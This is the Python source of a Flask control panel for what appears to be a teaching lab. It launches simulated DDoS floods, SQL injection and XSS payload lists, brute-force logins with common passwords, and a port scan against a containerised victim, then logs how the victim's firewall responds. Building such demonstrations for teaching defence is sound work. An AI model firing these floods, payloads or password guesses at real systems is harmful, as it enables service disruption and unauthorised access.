from flask import Flask, render_template, jsonify, request
import requests
import threading
import time
from datetime import datetime
import os
import logging
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/app/logs/controller.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('Controller')

app = Flask(__name__)

# Configuration
machines = {
    'victim': {
        'ip': os.getenv('VICTIM_IP', '172.20.0.10'),
        'port': 5000,
        'name': 'Victim Server',
        'services': ['Web Server', 'Database', 'Firewall']
    },
    'attacker': {
        'ip': os.getenv('ATTACKER_IP', '172.20.0.100'),
        'name': 'Attacker Machine'
    },
    'controller': {
        'ip': os.getenv('CONTROLLER_IP', '172.20.0.5'),
        'name': 'Control Center'
    }
}
ATTACKS = {
    'ddos': {
        'name': 'DDoS Attack',
        'description': 'Overwhelms the victim with many HTTP requests to simulate loss of availability.',
        'fn': None  # filled later with run_ddos_attack
    },
    'sql': {
        'name': 'SQL Injection',
        'description': 'Shows how unsanitized input can manipulate database queries.',
        'fn': None  # run_sql_injection
    },
    'bruteforce': {
        'name': 'Brute-Force Login',
        'description': 'Demonstrates repeated password guessing, account/IP lockout and firewall reactions.',
        'fn': None  # run_bruteforce_attack
    },
    'portscan': {
        'name': 'Port Scan',
        'description': 'Demonstrates reconnaissance: scanning ports to discover services.',
        'fn': None  # run_port_scan
    }
}


attack_status = {
    'running': False,
    'type': None,
    'logs': [],
    'start_time': None,
    'metrics': {}
}

LOG_DIR = '/app/logs'

def save_log_file(attack_type, logs):
    """Save attack logs to file"""
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    filename = f"{attack_type}_Attack_{timestamp}.log"
    filepath = os.path.join(LOG_DIR, filename)
    
    try:
        with open(filepath, 'w') as f:
            f.write(f"{'='*60}\n")
            f.write(f"Attack Type: {attack_type}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"Target: {machines['victim']['ip']}:{machines['victim']['port']}\n")
            f.write(f"{'='*60}\n\n")
            for log in logs:
                f.write(log + "\n")
        logger.info(f"Log file saved: {filename}")
        return filename
    except Exception as e:
        logger.error(f"Error saving log file: {str(e)}")
        return f"Error: {str(e)}"

def add_log(message):
    """Add log entry with timestamp"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    log_entry = f"[{timestamp}] {message}"
    attack_status['logs'].append(log_entry)
    logger.info(message)

def fetch_firewall_alerts():
    """Fetch real alerts from victim's firewall"""
    try:
        resp = requests.get(
            f"http://{machines['victim']['ip']}:{machines['victim']['port']}/firewall/alerts",
            timeout=2
        )
        if resp.status_code == 200:
            return resp.json().get('alerts', [])
    except Exception as e:
        logger.error(f"Error fetching firewall alerts: {str(e)}")
    return []

def fetch_firewall_stats():
    """Fetch firewall statistics"""
    try:
        resp = requests.get(
            f"http://{machines['victim']['ip']}:{machines['victim']['port']}/firewall/stats",
            timeout=2
        )
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        logger.error(f"Error fetching firewall stats: {str(e)}")
    return {}

def run_ddos_attack():
    """Execute DDoS attack simulation"""
    global attack_status
    attack_status['logs'] = []
    attack_status['start_time'] = time.time()
    
    victim_ip = machines['victim']['ip']
    victim_port = machines['victim']['port']
    
    add_log(f"🔴 ATTACK INITIATED: DDoS (Distributed Denial of Service)")
    add_log(f"Target: {machines['victim']['name']} ({victim_ip}:{victim_port})")
    add_log(f"Attack Pattern: 5 waves × 100 requests/wave")
    
    try:
        total_sent = 0
        total_blocked = 0
        total_timeout = 0
        
        for wave in range(1, 6):
            if not attack_status['running']:
                add_log("⚠️  Attack stopped by user")
                break
                
            add_log(f"Wave {wave}/5: Sending 100 HTTP GET requests...")
            
            success = 0
            blocked = 0
            timeout = 0
            
            for i in range(100):
                try:
                    resp = requests.get(
                        f'http://{victim_ip}:{victim_port}/',
                        timeout=1
                    )
                    if resp.status_code == 200:
                        success += 1
                        total_sent += 1
                    elif resp.status_code == 429:  # Rate limit
                        blocked += 1
                        total_blocked += 1
                    elif resp.status_code == 403:  # Forbidden/Blocked
                        blocked += 1
                        total_blocked += 1
                except requests.exceptions.Timeout:
                    timeout += 1
                    total_timeout += 1
                except Exception:
                    blocked += 1
                    total_blocked += 1
            
            success_rate = (success / 100) * 100
            add_log(f"Wave {wave} Complete: {success} successful ({success_rate:.1f}%), {blocked} blocked, {timeout} timeout")
            
            # Fetch real firewall alerts
            alerts = fetch_firewall_alerts()
            if alerts:
                latest_alert = alerts[-1]
                add_log(f"🛡️  FIREWALL ALERT: {latest_alert['message']}")
            
            time.sleep(2)
        
        # Final statistics
        total_requests = total_sent + total_blocked + total_timeout
        success_rate = (total_sent / total_requests * 100) if total_requests > 0 else 0
        
        add_log(f"\n{'='*50}")
        add_log(f"📊 ATTACK SUMMARY")
        add_log(f"{'='*50}")
        add_log(f"Total Requests: {total_requests}")
        add_log(f"Successful: {total_sent} ({success_rate:.1f}%)")
        add_log(f"Blocked by Firewall: {total_blocked}")
        add_log(f"Timeout: {total_timeout}")
        
        # Fetch comprehensive firewall stats
        fw_stats = fetch_firewall_stats()
        if fw_stats:
            add_log(f"\n🛡️  FIREWALL STATISTICS:")
            add_log(f"   - Blacklisted IPs: {fw_stats.get('blocked_count', 0)}")
            add_log(f"   - Total Alerts: {fw_stats.get('total_alerts', 0)}")
            add_log(f"   - Monitored IPs: {fw_stats.get('total_ips_tracked', 0)}")
        
        # Store metrics
        attack_status['metrics'] = {
            'total_requests': total_requests,
            'successful': total_sent,
            'blocked': total_blocked,
            'timeout': total_timeout,
            'success_rate': success_rate
        }
        
        duration = time.time() - attack_status['start_time']
        add_log(f"\n⏱️  Attack Duration: {duration:.2f} seconds")
        
        logfile = save_log_file('DDoS', attack_status['logs'])
        add_log(f"\n📁 Log saved: {logfile}")
        
    except Exception as e:
        add_log(f"❌ Error: {str(e)}")
        logger.error(f"DDoS attack error: {str(e)}", exc_info=True)
    finally:
        attack_status['running'] = False

def run_sql_injection():
    """Execute SQL injection attack simulation"""
    global attack_status
    attack_status['logs'] = []
    attack_status['start_time'] = time.time()
    
    victim_ip = machines['victim']['ip']
    victim_port = machines['victim']['port']
    
    add_log(f"🔴 ATTACK INITIATED: SQL Injection")
    add_log(f"Target: {machines['victim']['name']} ({victim_ip}:{victim_port}/login)")
    add_log(f"Testing various SQL injection techniques...")
    
    payloads = [
        ("' OR '1'='1", "Authentication Bypass (OR condition)"),
        ("admin'--", "Comment Injection"),
        ("' UNION SELECT NULL, username, password FROM users--", "UNION-based Injection"),
        ("' OR 1=1--", "Boolean-based Injection"),
        ("admin' AND SLEEP(5)--", "Time-based Blind Injection"),
        ("' OR 'a'='a", "Alternative OR condition"),
        ("1' OR '1' = '1')) --", "Nested condition bypass"),
        ("admin' /*", "Block comment injection"),
    ]
    
    try:
        blocked_count = 0
        success_count = 0
        failed_count = 0
        
        for idx, (payload, desc) in enumerate(payloads, 1):
            if not attack_status['running']:
                add_log("⚠️  Attack stopped by user")
                break
                
            add_log(f"\n[Test {idx}/{len(payloads)}] {desc}")
            add_log(f"   Payload: {payload}")
            
            try:
                resp = requests.post(
                    f'http://{victim_ip}:{victim_port}/login',
                    json={'username': payload, 'password': 'test'},
                    timeout=5
                )
                result = resp.json()
                
                if resp.status_code == 403 and result.get('blocked'):
                    add_log(f"   🛡️  BLOCKED BY WAF - {result.get('message', 'Pattern detected')}")
                    blocked_count += 1
                elif result.get('success'):
                    add_log(f"   ✓ VULNERABILITY EXPLOITED - Authentication bypassed!")
                    success_count += 1
                elif 'error' in result:
                    add_log(f"   ⚠️  SQL Error: {result['error'][:50]}...")
                    success_count += 1
                else:
                    add_log(f"   ✗ Failed - Protected")
                    failed_count += 1
                    
            except requests.exceptions.Timeout:
                add_log(f"   ⏱️  Timeout - Possible time-based blind injection")
                success_count += 1
            except Exception as e:
                add_log(f"   ❌ Error: {str(e)[:50]}")
                failed_count += 1
            
            time.sleep(1)
        
        # Summary
        total_tests = len(payloads)
        add_log(f"\n{'='*50}")
        add_log(f"📊 ATTACK SUMMARY")
        add_log(f"{'='*50}")
        add_log(f"Total Payloads Tested: {total_tests}")
        add_log(f"Exploitable Vulnerabilities: {success_count}")
        add_log(f"Blocked by Firewall: {blocked_count}")
        add_log(f"Protected/Failed: {failed_count}")
        
        # Get firewall alerts
        alerts = fetch_firewall_alerts()
        sql_alerts = [a for a in alerts if 'SQL' in a['message'].upper()]
        add_log(f"\n🛡️  Firewall SQL Injection Alerts: {len(sql_alerts)}")
        
        # Store metrics
        attack_status['metrics'] = {
            'total_tests': total_tests,
            'exploitable': success_count,
            'blocked': blocked_count,
            'failed': failed_count
        }
        
        duration = time.time() - attack_status['start_time']
        add_log(f"\n⏱️  Attack Duration: {duration:.2f} seconds")
        
        logfile = save_log_file('SQL_Injection', attack_status['logs'])
        add_log(f"\n📁 Log saved: {logfile}")
        
    except Exception as e:
        add_log(f"❌ Error: {str(e)}")
        logger.error(f"SQL injection error: {str(e)}", exc_info=True)
    finally:
        attack_status['running'] = False
        
def run_bruteforce_attack():
    global attack_status
    attack_status['logs'] = []
    attack_status['start_time'] = time.time()

    victim_ip = machines['victim']['ip']
    victim_port = machines['victim']['port']

    add_log("🔴 ATTACK INITIATED: Brute-Force Login")
    add_log(f"Target: {machines['victim']['name']} ({victim_ip}:{victim_port}/login)")
    add_log("Goal: Show repeated login attempts, lockout and firewall IP blocking.\n")

    usernames = ['admin', 'user1']
    passwords = ['123456', 'password', 'admin', 'admin123', 'pass123']
    attempts = 0
    successes = 0
    blocked = 0

    try:
        for u in usernames:
            for p in passwords:
                if not attack_status['running']:
                    add_log("⚠️ Attack stopped by user")
                    break

                attempts += 1
                add_log(f"Attempt {attempts}: {u}:{p}")

                try:
                    resp = requests.post(
                        f"http://{victim_ip}:{victim_port}/login",
                        json={"username": u, "password": p},
                        timeout=3
                    )
                    data = resp.json()
                    if resp.status_code == 403 and data.get('blocked'):
                        add_log("🛡️  BLOCKED: Firewall / lockout triggered")
                        blocked += 1
                        # once blocked, no need to continue hammering for didactic purposes
                        attack_status['running'] = False
                        break
                    if data.get('success'):
                        add_log(f"✅ SUCCESS: valid credentials {u}:{p}")
                        successes += 1
                    else:
                        add_log("✗ Failed: invalid or rejected")
                except Exception as e:
                    add_log(f"❌ Error: {str(e)[:60]}")

                time.sleep(0.3)
            if not attack_status['running']:
                break

        add_log("\n📊 Brute-force summary:")
        add_log(f"   Attempts: {attempts}")
        add_log(f"   Successful logins: {successes}")
        add_log(f"   Blocking events: {blocked}")

        logfile = save_log_file('BruteForce', attack_status['logs'])
        add_log(f"📁 Log saved: {logfile}")
    finally:
        attack_status['running'] = False
        

def run_xss_attack():
    """Execute XSS attack simulation"""
    global attack_status
    attack_status['logs'] = []
    attack_status['start_time'] = time.time()
    
    victim_ip = machines['victim']['ip']
    victim_port = machines['victim']['port']
    
    add_log(f"🔴 ATTACK INITIATED: Cross-Site Scripting (XSS)")
    add_log(f"Target: {machines['victim']['name']} ({victim_ip}:{victim_port}/search)")
    
    payloads = [
        ("<script>alert('XSS')</script>", "Basic Script Tag"),
        ("<img src=x onerror=alert('XSS')>", "Image Event Handler"),
        ("<svg/onload=alert('XSS')>", "SVG Onload"),
        ("javascript:alert('XSS')", "JavaScript Protocol"),
        ("<iframe src='javascript:alert(1)'>", "IFrame JavaScript"),
        ("<body onload=alert('XSS')>", "Body Event Handler"),
    ]
    
    try:
        blocked_count = 0
        success_count = 0
        
        for idx, (payload, desc) in enumerate(payloads, 1):
            if not attack_status['running']:
                break
                
            add_log(f"\n[Test {idx}/{len(payloads)}] {desc}")
            add_log(f"   Payload: {payload}")
            
            try:
                resp = requests.post(
                    f'http://{victim_ip}:{victim_port}/search',
                    json={'query': payload},
                    timeout=5
                )
                result = resp.json()
                
                if resp.status_code == 403 and result.get('blocked'):
                    add_log(f"   🛡️  BLOCKED - {result.get('message', 'XSS pattern detected')}")
                    blocked_count += 1
                elif result.get('results'):
                    add_log(f"   ✓ POTENTIALLY VULNERABLE - Payload accepted")
                    success_count += 1
                else:
                    add_log(f"   ✗ Failed")
                    
            except Exception as e:
                add_log(f"   ❌ Error: {str(e)[:50]}")
            
            time.sleep(1)
        
        add_log(f"\n{'='*50}")
        add_log(f"📊 XSS Test Summary: {success_count} accepted, {blocked_count} blocked")
        
        attack_status['metrics'] = {
            'total_tests': len(payloads),
            'accepted': success_count,
            'blocked': blocked_count
        }
        
        logfile = save_log_file('XSS', attack_status['logs'])
        add_log(f"\n📁 Log saved: {logfile}")
        
    except Exception as e:
        add_log(f"❌ Error: {str(e)}")
    finally:
        attack_status['running'] = False

def run_port_scan():
    """Execute port scan simulation"""
    global attack_status
    attack_status['logs'] = []
    attack_status['start_time'] = time.time()
    
    victim_ip = machines['victim']['ip']
    
    add_log(f"🔴 ATTACK INITIATED: Port Scan")
    add_log(f"Target: {machines['victim']['name']} ({victim_ip})")
    add_log(f"Scanning common ports...")
    
    ports = [21, 22, 23, 25, 80, 443, 3306, 5000, 8080, 8443]
    
    try:
        open_ports = []
        closed_ports = []
        
        for port in ports:
            if not attack_status['running']:
                break
                
            add_log(f"Scanning port {port}...")
            
            try:
                resp = requests.get(f'http://{victim_ip}:{port}/', timeout=2)
                add_log(f"   ✓ Port {port} OPEN - Service responding")
                open_ports.append(port)
            except requests.exceptions.ConnectionError:
                add_log(f"   ✗ Port {port} CLOSED")
                closed_ports.append(port)
            except Exception:
                add_log(f"   ✗ Port {port} CLOSED/FILTERED")
                closed_ports.append(port)
            
            time.sleep(0.5)
        
        add_log(f"\n{'='*50}")
        add_log(f"📊 PORT SCAN RESULTS")
        add_log(f"{'='*50}")
        add_log(f"Open Ports ({len(open_ports)}): {open_ports}")
        add_log(f"Closed Ports ({len(closed_ports)}): {closed_ports}")
        
        attack_status['metrics'] = {
            'total_ports': len(ports),
            'open': len(open_ports),
            'closed': len(closed_ports),
            'open_ports': open_ports
        }
        
        logfile = save_log_file('Port_Scan', attack_status['logs'])
        add_log(f"\n📁 Log saved: {logfile}")
        
    except Exception as e:
        add_log(f"❌ Error: {str(e)}")
    finally:
        attack_status['running'] = False
        
ATTACKS['ddos']['fn'] = run_ddos_attack
ATTACKS['sql']['fn'] = run_sql_injection
ATTACKS['bruteforce']['fn'] = run_bruteforce_attack
ATTACKS['portscan']['fn'] = run_port_scan
        

# Flask routes
@app.route('/')
def index():
    """Render main interface"""
    return render_template('index.html', machines=machines)

@app.route('/api/start_attack', methods=['POST'])
def start_attack():
    if attack_status['running']:
        return jsonify({'error': 'Attack already running'}), 400

    attack_type = request.json.get('type')
    if attack_type not in ATTACKS:
        return jsonify({'error': 'Unknown attack type'}), 400

    attack_status['running'] = True
    attack_status['type'] = attack_type
    attack_status['logs'] = []
    attack_status['metrics'] = {}

    fn = ATTACKS[attack_type]['fn']
    thread = threading.Thread(target=fn, daemon=True)
    thread.start()

    return jsonify({'status': 'started', 'type': attack_type})


@app.route('/api/stop_attack', methods=['POST'])
def stop_attack():
    """Stop running attack"""
    if attack_status['running']:
        attack_status['running'] = False
        logger.info("Attack stopped by user")
        return jsonify({'status': 'stopped'})
    return jsonify({'error': 'No attack running'}), 400

@app.route('/api/status')
def get_status():
    """Get current attack status"""
    return jsonify(attack_status)

@app.route('/api/metrics')
def get_metrics():
    """Get victim and firewall metrics"""
    try:
        fw_stats = fetch_firewall_stats()
        return jsonify({
            'firewall': fw_stats,
            'attack': attack_status.get('metrics', {})
        })
    except Exception as e:
        logger.error(f"Error fetching metrics: {str(e)}")
        return jsonify({'error': 'Unable to fetch metrics'}), 500

@app.route('/api/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })

if __name__ == '__main__':
    logger.info("Controller starting...")
    logger.info(f"Victim: {machines['victim']['ip']}:{machines['victim']['port']}")
    app.run(host='0.0.0.0', port=5000, debug=False)
